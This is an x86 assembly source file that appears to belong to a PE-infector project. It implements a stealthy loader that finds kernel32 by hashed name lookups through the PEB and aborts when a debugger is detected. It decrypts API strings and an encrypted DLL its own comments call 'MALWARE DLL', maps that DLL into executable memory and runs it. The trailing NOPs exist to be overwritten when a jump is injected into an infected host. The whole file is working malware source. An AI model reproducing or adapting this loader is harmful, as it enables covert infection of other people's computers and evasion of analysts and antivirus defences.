; Module:  loader_x86.asm
; Author:  Toni <matzeton@googlemail.com>
; Purpose: 1. reserve stack memory and decrypt strings
;          2. get kernel32.dll base address
;          3. get required function ptr (VirtualAlloc,IsBadReadPtr)
;          4. allocate virtual memory (heap)
;          5. copy sections from dll
;          6. run minimal crt at AddressOfEntry
;
; WARNING: Any changes in this file require a *FULL* project rebuild!
;    e.g.: `git clean -df . ; cmake . ; make -j4`


%ifndef _LDR_SECTION
%error "expected _LDR_SECTION to be defined"
%endif
%ifndef _LOADER_ENDMARKER
%error "expected _LOADER_ENDMARKER to be defined"
%endif

SECTION _LDR_SECTION
GLOBAL __ldr_start

%define STRVALLOC     'VirtualAlloc',0x00
%define STRRPTR       'IsBadReadPtr',0x00
%define STRIVKEYSIZE  0x03
%strlen LEN_STRVALLOC STRVALLOC
%strlen LEN_STRRPTR   STRRPTR

%define IVKEYSIZE     0x08

; const data offsets
ESI_MINSTACK   EQU       0x00   ; minimal stack memory (can be modified by DLL)
ESI_STRVALLOC  EQU       0x04   ; string 'VirtualAlloc',0x00 -> encrypted by file_crypt
ESI_STRRPTR    EQU       0x11   ; string 'IsBadReadPtr',0x00 ->     "      "     "
ESI_DLLIV      EQU       0x1E   ; DLL npcbc xor iv
ESI_DLLKEY     EQU       0x3E   ; DLL npcbc xor key
ESI_FLAGS      EQU       0x5E   ; DLL Flags
ESI_PTRDLL     EQU       0x60   ; PtrToDLL
ESI_SIZDLL     EQU       0x64   ; SizeOfDLL
; reserve memory on stack (use a multiple of 4 bytes, and at least 0x4C bytes!)
STACKMEM       EQU       0x4C
; stack offsets
OFF_KERNEL32   EQU       0x00   ; KERNEL32 base address
OFF_PROCADDR   EQU       0x04   ; FuncPtrGetProcAddress
OFF_VALLOC     EQU       0x08   ; FuncPtrVirtualAlloc
OFF_BADRPTR    EQU       0x0C   ; FuncPtrIsBadReadPtr
OFF_ADROFENTRY EQU       0x10   ; AddressOfEntryPoint
OFF_IMAGEBASE  EQU       0x14   ; DLL ImageBase
OFF_SIZOFIMAGE EQU       0x18   ; DLL SizeOfImage
OFF_SIZOFHEADR EQU       0x1C   ; DLL SizeOfHeaders
OFF_FSTSECTION EQU       0x20   ; DLL FirstSection
OFF_NUMSECTION EQU       0x24   ; DLL NumberOfSections
OFF_VALLOCBUF  EQU       0x28   ; buffer from VirtualAlloc
OFF_STRVALLOC  EQU       0x2C   ; string 'VirtualAlloc',0x00 -> decrypted
OFF_STRRPTR    EQU       0x39   ; string 'IsBadReadPtr',0x00 -> decrypted
OFF_PTRDLL     EQU       0x46   ; PtrToDLL (either a section, if plain, or an alloc'd buffer, if encrypted)

; 32 Bit NULL value (used for databytes)
%define NULL             0x00,0x00,0x00,0x00
; 16 Bit NULL value
%define NULL16           0x00,0x00


; safe jump (so we can jump to the start of our loader buffer later)
jmp near __ldr_start

; include our decrypter
%pathsearch DECRYPTER_SRC "/decrypter_x86.asm"
%include DECRYPTER_SRC

; Calculate a 32 bit hash from a string (non-case-sensitive)
; arguments: esi = ptr to string
;            ecx = bufsiz
; modifies : eax, edi
; return   : 32 bit hash value in edi
__ldr_calcStrHash:
  xor edi,edi
  __ldr_calcHash_loop:
  xor eax,eax
  lodsb                         ; read in the next byte of the name [esi] and store it in al
  cmp al,'a'                    ; some versions of Windows use lower case module names
  jl __ldr_calcHash_not_lowercase
  sub al,0x20                   ; if so normalise to uppercase
  __ldr_calcHash_not_lowercase:
  ror edi,13                    ; rotate right our hash value
  add edi,eax                   ; add the next byte of the name to the hash
  loop __ldr_calcHash_loop
  ret


; Get base address of kernel32.dll (alternative way through PEB)
; arguments: -
; modifies : eax, ebx
; return   : base addres in eax
__ldr_getModuleHandleKernel32PEB:
  ; see http://www.rohitab.com/discuss/topic/38717-quick-tutorial-finding-kernel32-base-and-walking-its-export-table
  ; and http://www.rohitab.com/discuss/topic/35251-3-ways-to-get-address-base-kernel32-from-peb
  mov eax,[fs:0x30]                  ; PEB
%ifndef _DEBUG
  ; check if we were beeing debugged
  xor ebx,ebx
  mov bl,[eax + 0x2]                 ; BeeingDebugged
  test bl,bl
  jnz __ldr_getModuleHandleKernel32PEB_fail
  ; PEB NtGlobalFlag == 0x70 ?
  ; see http://antukh.com/blog/2015/01/19/malware-techniques-cheat-sheet
  xor ebx,ebx
  mov bl,[eax + 0x68]
  cmp bl,0x70
  je __ldr_getModuleHandleKernel32PEB_fail
%endif
  mov eax,[eax+0x0c]                 ; PEB->Ldr
  mov eax,[eax+0x14]                 ; PEB->Ldr.InMemoryOrderModuleList.Flink (1st entry)
  mov ebx,eax
  xor ecx,ecx
  __ldr_getModuleHandleKernel32PEB_loop:
  pushad
  mov esi,[ebx+0x28]                 ; Flink.ModuleName (16bit UNICODE)
  mov ecx,0x18                       ; max module length: 24 -> len('kernel32.dll')*2
  call __ldr_calcStrHash
  cmp edi,0x6A4ABC5B                 ; pre calculated module name hash of 'kernel32.dll'
  popad
  mov ecx,[ebx+0x10]                 ; get base address
  mov ebx,[ebx]
  jne __ldr_getModuleHandleKernel32PEB_loop
  mov eax,ecx
  ret
  __ldr_getModuleHandleKernel32PEB_fail:
  xor eax,eax
  ret


; Get Address of GetProcAddress from module export directory
; arguments: eax = kernel32 base address
; modifies : eax, ebx, ecx, edi, edx, esi
; return   : eax
__ldr_getAdrOfGetProcAddress:
  mov ebx,eax
  add ebx,[eax+0x3c]                 ; PE header
  mov ebx,[ebx+0x78]                 ; RVA export directory
  add ebx,eax
  mov esi,[ebx+0x20]                 ; RVA Export Number Table
  add esi,eax                        ; VA of ENT
  mov edx,eax                        ; remember kernel base
  xor ecx,ecx
  __ldr_getAdrOfGetProcAddress_loop:
    inc ecx
    lodsd                            ; load dword from esi into eax
    add eax,edx                      ; add kernel base
    pushad
    mov esi,eax                      ; string
    mov ecx,14                       ; len('GetProcAddress')
    call __ldr_calcStrHash
    cmp edi,0x1ACAEE7A               ; pre calculated hash of 'GetProcAddress'
    popad
    jne __ldr_getAdrOfGetProcAddress_loop
  dec ecx
  mov edi,ebx
  mov edi,[edi+0x24]                 ; RVA of Export Ordinal Table
  add edi,edx                        ; VA of EOT
  movzx edi,word [ecx*2+edi]         ; ordinal to function
  mov eax,ebx
  mov eax,[eax+0x1c]                 ; RVA of Export Address Table
  add eax,edx                        ; VA of EAT
  mov eax,[edi*4+eax]                ; RVA of GetProcAddress
  add eax,edx                        ; VA of GetProcAddress
  ret


; Get function pointer by function name
; arguments: ebx = base address of module
;            ecx = string pointer to function name
; modifies : eax
; return   : address in eax
__ldr_getProcAddress:
  mov eax,[ebp + OFF_PROCADDR]           ; ptr to GetProcAddress(...)
  push ecx
  push ebx
  call eax
  ret


; Check if pointer is readable
; arguments: ebx = pointer
;            ecx = size
; modifies : eax
; return   : [0,1] in eax
__ldr_isBadReadPtr:
  push ecx
  push ebx
  mov eax,[ebp + OFF_BADRPTR] ; PtrIsBadReadPtr
  call eax
  ret


; Allocate virtual memory in our current process space
; arguments: eax  = Alloc Flags [0: PAGE_EXECUTE_READWRITE , 1:PAGE_READWRITE]
;            ebx = preffered address
;            ecx = size of memory block
; modifies : eax, edx
; return   : ptr in eax
__ldr_VirtualAlloc:
  xor edx,edx
  mov dl,0x40         ; PAGE_EXECUTE_READWRITE
  test al,0x01
  cmovz ax,dx         ; if al == 0 then 0x40 (PAGE_EXECUTE_READWRITE)
  shr dl,0x04         ; PAGE_READWRITE
  test al,0x01
  cmovnz ax,dx        ; if al == 1 then 0x04 (PAGE_READWRITE)
  push eax            ; PUSH Alloc Flags on stack for subsequent calls (see below)
  push ecx            ; save size for a possible second call to VirtualAlloc(...)
  ; VirtualAlloc API call
  push eax            ; PAGE ACCESS FLAGS for VirtualAlloc
  push dword 0x3000   ; MEM_RESERVE | MEM_COMMIT
  push ecx
  push ebx
  mov eax,[ebp + OFF_VALLOC] ; PtrVirtualAlloc
  call eax
  test eax,eax
  pop ecx             ; restore size
  jnz __ldr_VirtualAlloc_success
  ; base address already taken
  push dword 0x3000   ; MEM_RESERVE | MEM_COMMIT
  push ecx
  xor eax,eax
  push eax
  mov eax,[ebp + OFF_VALLOC] ; PtrVirtualAlloc
  call eax
  push edx
  __ldr_VirtualAlloc_success:
  pop edx             ; POP either Alloc Flags or EDX
  ret


; Read DLL PE header from memory
; arguments: ebx = ptr to memory
; modifies : eax, ecx, edx
; return   : [0,1] in eax
__ldr_ReadPE:
  ; check dos magic number
  xor ecx,ecx
  mov cx,[ebx]
  cmp cx,0x5a4d                     ; Magic number (DOS-HEADER)
  jne near __ldr_ReadPE_fail
  ; e_lfanew
  mov ecx,ebx
  add ecx,0x3c                      ; OFFSET: e_lfanew
  mov eax,[ecx]                     ; e_lfanew
  ; check if 0x40 <= e_lfanew <= 0x80 (default value)
  cmp eax,0x80
  ja near __ldr_ReadPE_fail
  cmp eax,0x40
  jb near __ldr_ReadPE_fail
  ; NT(PE)-Header
  add eax,ebx                       ; [e_lfanew + ptr] = NT-HEADER
  mov ecx,eax                       ; *** save NT-HEADER in ECX ***
  ; check pe magic number
  xor eax,eax
  mov eax,[ecx]
  cmp ax,0x4550                     ; 'EP' -> 'PE'
  jne __ldr_ReadPE_fail
  ; check opt header magic
  mov eax,ecx
  add eax,0x18                      ; [NT-HEADER + 0x18] = opt header magic
  mov edx,eax
  xor eax,eax
  mov ax,[edx]
  cmp ax,0x010b                     ; 0x010b = PE32
  jne short __ldr_ReadPE_fail
  ; entry point VA
  mov eax,ecx
  add eax,0x28
  mov eax,[eax]
  mov [ebp + OFF_ADROFENTRY],eax
  ; get image base && image size
  mov eax,ecx
  add eax,0x34                      ; [NT-HEADER + 0x34] = ImageBase
  mov eax,[eax]
  test eax,eax                      ; check if ImageBase is not NULL
  jz short __ldr_ReadPE_fail
  mov [ebp + OFF_IMAGEBASE], eax
  mov eax,ecx
  add eax,0x50                      ; [NT-HEADER + 0x50] = SizeOfImage
  mov eax,[eax]
  test eax,eax
  jz short __ldr_ReadPE_fail        ; check if ImageSize is not zero
  mov [ebp + OFF_SIZOFIMAGE], eax
  ; get size of headers
  mov eax,ecx
  add eax,0x54                      ; [NT-HEADER + 0x54] = SizeOfHeaders
  mov eax,[eax]
  test eax,eax
  jz short __ldr_ReadPE_fail
  mov [ebp + OFF_SIZOFHEADR], eax
  ; get number of sections
  mov edx,ecx
  add edx,0x6                       ; [NT-HEADER + 0x8] = NumberOfSections
  xor eax,eax
  mov ax,[edx]
  test eax,eax
  jz short __ldr_ReadPE_fail
  mov [ebp + OFF_NUMSECTION], eax
  ; get ptr to first section
  mov edx,ecx
  add edx,0x14                      ; [NT-HEADER + 0x14] = SizeOfOptionalHeaders
  xor eax,eax
  mov ax,[edx]
  mov edx,eax
  mov eax,ecx
  add eax,0x18
  add eax,edx                      ; [NT-HEADER + 0x18 + SizeOfOptionalHeaders] = FirstSection
  mov [ebp + OFF_FSTSECTION], eax
  ; return true
  xor eax,eax
  inc eax
  ret
  __ldr_ReadPE_fail:
  xor eax,eax
  ret



; Loader Entry
__ldr_start:
  ; new stack frame
  push ebp
  ; save gpr+flag regs
  pushad
  pushfd
  ; GET POINTER TO CONST DATA
  jmp near __ldr_ConstData
  __ldr_gotConstData:
  pop esi                            ; pointer to const data in ESI
  ; RESERVE STACK memory
  sub esp, [esi + ESI_MINSTACK]
  mov ebp, esp                       ; backup ptr for subroutines
  push esi                           ; required to make REPMOVSD work!

  call __ldr_getModuleHandleKernel32PEB ; module handle in eax
  mov [ebp + OFF_KERNEL32],eax
  test eax,eax                       ; check if module handle is not NULL
  jz __ldr_end_esi
  call __ldr_getAdrOfGetProcAddress  ; adr of GetProcAddress in eax
  mov [ebp + OFF_PROCADDR],eax

  ; copy encrypted 'VirtualAlloc','IsBadReadPtr' string to [ebp + OFF_STRVALLOC],[epb + OFF_STRRPTR]
  xor ecx,ecx
  mov cl,STRIVKEYSIZE                ; siz (ivkeysize)
  mov esi,[esp]                      ; src = esi
  add esi,ESI_STRVALLOC              ; src
  mov edi,ebp
  add edi,OFF_STRVALLOC              ; dst
  rep movsd                          ; memcpy
  xor ecx,ecx
  mov cl,STRIVKEYSIZE                ; siz (ivkeysize)
  mov esi,[esp]                      ; srx = esi
  add esi,ESI_STRRPTR                ; src
  mov edi,ebp
  add edi,OFF_STRRPTR                ; dst
  rep movsd                          ; memcpy

  ; decrypt 'VirtualAlloc' string
  mov esi,[esp]                      ; decryption routine needs esi
  push dword STRIVKEYSIZE            ; ivkeysize
  mov eax,esi
  add eax,ESI_DLLKEY
  push dword eax                     ; key_ptr32
  mov eax,esi
  add eax,ESI_DLLIV
  push dword eax                     ; iv_ptr32
  push dword LEN_STRVALLOC           ; size_u32
  mov eax,ebp
  add eax,OFF_STRVALLOC
  push dword eax                     ; buffer_ptr32
  call __decrypt_x86                 ; decryption routine (see: source/decrypter_x86.asm)
  add esp,0x14                       ; cleanup arguments
  mov byte [ebp + OFF_STRVALLOC + LEN_STRVALLOC],0x00
  test al,0xFF
  jz __ldr_end_esi

  ; decrypt 'IsBadReadPtr' string
  mov esi,[esp]                      ; decryption routine needs esi
  push dword STRIVKEYSIZE            ; ivkeysize
  mov eax,esi
  add eax,ESI_DLLKEY
  push dword eax                     ; key_ptr32
  mov eax,esi
  add eax,ESI_DLLIV
  push dword eax                     ; iv_ptr32
  push dword LEN_STRRPTR             ; size_u32
  mov eax,ebp
  add eax,OFF_STRRPTR
  push dword eax                     ; buffer_ptr32
  call __decrypt_x86                 ; decryption routine (see: source/decrypter_x86.asm)
  add esp,0x14                       ; cleanup arguments
  mov byte [ebp + OFF_STRRPTR + LEN_STRRPTR],0x00
  test al,0xFF
  jz __ldr_end_esi

  pop esi                            ; restore esi (ptr to const data)

  ; *** STACK LAYOUT ***
  ;  [ebp]        = Kernel32Base     | [ebp + 0x04]  = PtrGetProcAddress
  ;  [ebp + 0x08] = PtrVirtualAlloc  | [ebp + 0x0C] = PtrIsBadReadPtr
  ;  [ebp + 0x10] = AddressOfEntryPoint
  ;  [ebp + 0x14] = ImageBase        | [ebp + 0x18] = SizeOfImage
  ;  [ebp + 0x1C] = SizeOfHeaders    | [ebp + 0x20] = FirstSection
  ;  [ebp + 0x24] = NumberOfSections | [ebp + 0x28] = vallocBuf
  ;  [ebp + 0x2C] = sz'VirtualAlloc' | [ebo + 0x39] = sz'IsBadReadPtr'

  ; GetProcAddress(KERNEL32BASE, 'VirtualAlloc')
  mov ebx, [ebp + OFF_KERNEL32]      ; KERNEL32BASE
  mov ecx, ebp
  add ecx, OFF_STRVALLOC
  call __ldr_getProcAddress          ; eax holds function pointer of VirtualAlloc
  test eax,eax
  jz __ldr_end
  mov [ebp + OFF_VALLOC], eax
  ; GetProcAddress(KERNEL32BASE, 'IsBadReadPtr')
  mov ecx, ebp
  add ecx, OFF_STRRPTR
  call __ldr_getProcAddress          ; eax holds function pointer of IsBadReadPtr
  test eax,eax
  jz __ldr_end
  mov [ebp + OFF_BADRPTR], eax
  ; check if malware dll pointer is valid
  mov ebx, [esi + ESI_PTRDLL]
  mov [ebp + OFF_PTRDLL], ebx
  mov ecx, [esi + ESI_SIZDLL]
  call __ldr_isBadReadPtr
  test eax,eax
  jnz __ldr_end
  ; ReadPE
  mov ebx, [ebp + OFF_PTRDLL]
  call __ldr_ReadPE
  test al,0x01
  jnz __ldr_validPE

  ; VirtalAlloc(...) encrypted DLL section
  xor ebx, ebx
  mov ecx, [esi + ESI_SIZDLL]
  xor al,al
  inc al
  call __ldr_VirtualAlloc
  test eax,eax
  jz __ldr_end
  mov [ebp + OFF_PTRDLL], eax
  ; copy encrypted DLL section to alloc'd ptr
  push esi
  mov eax,[esi + ESI_SIZDLL]          ; siz
  xor ecx,ecx
  xor edx,edx
  mov cl,0x04
  div ecx
  mov ecx,eax
  mov esi,[esi + ESI_PTRDLL]          ; src
  mov edi,[ebp + OFF_PTRDLL]          ; dst
  rep movsd                           ; memcpy
  pop esi
  ; decrypt PE
  push esi
  push dword IVKEYSIZE               ; ivkeysize
  mov eax,esi
  add eax,ESI_DLLKEY
  push dword eax                     ; key_ptr32
  mov eax,esi
  add eax,ESI_DLLIV
  push dword eax                     ; iv_ptr32
  push dword [esi + ESI_SIZDLL]      ; size_u32
  push dword [ebp + OFF_PTRDLL]      ; buffer_ptr32
  call __decrypt_x86                 ; decryption routine (see: source/decrypter_x86.asm)
  add esp,0x14                       ; cleanup arguments
  pop esi
  dec eax
  test eax,0xFFFFFFFF
  jz __ldr_end
  ; read dll pe header (ebx = PtrToDLL)
  mov ebx,[ebp + OFF_PTRDLL]
  call __ldr_ReadPE
  test al,0x01
  jz __ldr_end

  __ldr_validPE:
  ; VirtualAlloc(...)
  mov ebx,[ebp + OFF_IMAGEBASE]      ; ImageBase (MALWARE-DLL)
  mov ecx,[ebp + OFF_SIZOFIMAGE]     ; SizeOfImage (MALWARE-DLL)
  xor al,al
  call __ldr_VirtualAlloc            ; eax holds pointer to allocated memory
  test eax,eax
  jz __ldr_end
  mov [ebp + OFF_VALLOCBUF],eax
  ; copy sections
  mov ecx,[ebp + OFF_NUMSECTION]
  mov ebx,[ebp + OFF_FSTSECTION]
  __ldr_section_copy:
  mov edx,ebx
  add edx,0xc                        ; RVA of section[i]
  mov edx,[edx]
  add edx,[ebp + OFF_VALLOCBUF]      ; VA of section[i]
  mov edi,ebx
  add edi,0x10
  mov edi,[edi]                      ; SizeOfRawData
  mov eax,ebx
  add eax,0x14
  mov eax,[eax]
  add eax,[ebp + OFF_PTRDLL]
  ; copy one section
  pushad
  mov ebx,eax                        ; src
  mov eax,edi                        ; siz
  mov edi,edx                        ; dst
  xor ecx,ecx
  xor edx,edx
  mov cl,0x04
  div ecx
  mov ecx,eax
  mov esi,ebx                        ; src
  rep movsd                          ; memcpy
  popad
  ; next
  add ebx,0x28                       ; sizeof(IMAGE_SECTION_HEADER)
  loop __ldr_section_copy
  ; CRT Entry Point
  mov eax,[ebp + OFF_ADROFENTRY]     ; RVA
  add eax,[ebp + OFF_VALLOCBUF]      ; DLL image start adr (RWX) -> ImageBase
  push esi                           ; save esi for stack cleanup
  ; arguments
  mov ebx,0xdeadbeef                 ; identificator
  mov ecx,[ebp + OFF_PROCADDR]       ; getProcAdr
  mov edx,[ebp + OFF_KERNEL32]       ; Kernel32Base
  mov edi,[ebp + OFF_VALLOCBUF]      ; dll base adr
  push dword [ebp + OFF_PTRDLL]
  call eax                           ; call AddressOfEntry (MALWARE-CRT)
  pop esi
__ldr_end_esi:
  pop esi
__ldr_end:
  ; CLEANUP STACK
  mov ebx,[esi + ESI_MINSTACK]
  add esp,ebx
  ; restore old gpr+flag regs
  popfd
  popad
  ; cleanup stack frame
  pop ebp
  ; NOPs (can be overwritten by the MALWARE if JMP to __ldr_start was injected
  ; replaceable nops (15 bytes max instruction length for x86/x86_64)
  nop
  nop
  nop
  nop
  nop
  nop
  nop
  nop
  nop
  nop
  nop
  nop
  nop
  nop
  nop
  ; `jump back` nops
  nop
  nop
  nop
  nop
  nop
  ; return if call'd
  ret
  ; CONSTS MODIFIED BY THE MALWARE
  __ldr_ConstData:
  call near __ldr_gotConstData
  ; struct loader_x86_data (see: include/loader.h)
__ldr_struct:

  dd STACKMEM                        ; minimal stack size (used by source/patch.c)
  db STRVALLOC                       ; encrypted str for getprocadr (used by source/tools/file_crypt.c)
  db STRRPTR                         ;    "       "   "      "      (used by source/tools/file_crypt.c)
  db NULL,NULL,NULL,NULL             ; iv[0..3]
  db NULL,NULL,NULL,NULL             ; iv[4..7]
  db NULL,NULL,NULL,NULL             ; key[0..3]
  db NULL,NULL,NULL,NULL             ; key[4..7]
  db NULL16                          ; DLL Flags
  db NULL                            ; Pointer to MALWARE DLL (used by batch/patchLoader.py and source/patch.c)
  db NULL                            ; Size of MALWARE DLL (used by batch/patchLoader.py and source/patch.c)
  db _LOADER_ENDMARKER               ; unused, end marker (currently used by batch/patchLoader.py, source/tools/file_crypt.c and source/pe_infect.c)

LOADER_SIZE EQU ($ - __ldr_struct)
